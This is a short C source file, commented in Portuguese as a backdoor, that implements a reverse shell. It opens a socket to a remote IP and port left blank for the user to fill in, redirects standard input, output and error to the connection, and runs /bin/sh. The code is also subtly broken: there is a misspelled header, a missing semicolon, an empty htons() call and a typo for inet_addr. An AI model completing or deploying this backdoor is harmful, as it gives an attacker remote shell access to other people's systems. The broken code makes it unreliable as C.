#include <sys/type.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    
    //BACKDOOR EM C
    
    int sock;
    struct sockaddr_in con;
    
    sock = socket(AF_INET, SOCK_STREAM, 0)
    
    con.sin_family = AF_INET;
    con.sin_port = htons(); //porta para conexao
    con.sin_addr = inet.addr(""); //IP
    
    connect(sock, (struct sockaddr *)&con, sizeof(con));
    
    dup2(sock, 0);dup2(sock,1);dup2(sock,2);execve("/bin/sh",0,0);
    
    return 0;
}